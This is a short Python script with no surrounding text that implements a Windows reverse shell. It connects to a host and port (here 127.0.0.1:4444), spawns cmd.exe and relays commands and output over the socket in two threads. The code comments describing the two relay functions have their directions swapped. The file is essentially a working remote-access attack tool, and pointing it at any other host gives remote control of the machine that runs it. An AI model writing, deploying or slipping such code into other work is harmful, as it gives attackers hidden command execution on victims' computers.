import socket
import subprocess
import threading
import os

host, port = '127.0.0.1', 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Start the shell process (cmd.exe for Windows)
# redirected stdin, stdout, and stderr to pipes
p = subprocess.Popen(['cmd.exe'], 
                     stdin=subprocess.PIPE, 
                     stdout=subprocess.PIPE, 
                     stderr=subprocess.PIPE, 
                     shell=True,
                     text=True)

# Function to read from the shell and send to the socket
def s2p():
    while True:
        data = s.recv(1024).decode()
        p.stdin.write(data)
        p.stdin.flush()

# Function to read from the socket and send to the shell
def p2s():
    while True:
        output = p.stdout.read(1)
        s.send(output.encode())

# Use threading to handle the bidirectional flow
threading.Thread(target=s2p, daemon=True).start()
threading.Thread(target=p2s, daemon=True).start()

p.wait()
